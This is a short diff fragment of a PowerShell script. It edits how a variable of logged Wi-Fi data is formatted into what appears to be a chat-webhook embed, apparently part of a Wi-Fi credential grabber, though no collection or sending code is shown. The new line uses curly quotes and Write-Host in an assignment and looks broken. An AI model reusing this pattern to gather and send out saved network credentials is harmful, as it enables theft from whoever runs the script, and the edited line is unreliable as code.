@@ -28,7 +28,7 @@ $forEmbed =  [PSCustomObject]@{
     'color'       = '16744960'
     'fields'   = @(@{
     'name' = ""
-    'value' = $loggedwifis | Format-Table | Out-String
+    'value' = $loggedwifis | Format-Table | Out-String -Stream | ForEach-Object { Write-Host ‘ ‘ + $_ }
     })
 }
 
